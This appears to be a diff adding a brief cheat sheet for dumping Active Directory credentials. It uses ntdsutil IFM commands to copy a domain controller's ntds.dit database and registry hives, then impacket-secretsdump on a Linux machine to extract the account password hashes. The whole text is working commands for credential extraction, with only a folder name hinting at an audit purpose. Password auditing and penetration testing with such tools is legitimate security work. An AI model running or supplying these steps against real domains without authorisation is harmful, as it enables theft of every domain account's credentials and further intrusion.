@@ -1,0 +1,12 @@
+Create dump ntds.dit
+
+C:\Windows\System32> ntdsutil.exe
+ntdsutil: active instance ntds
+ifm: create full c:\audit
+ifm:quit
+ntdsutil.exe: quit
+
+Extract dump ntds.dit (linux machine)
+
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
+
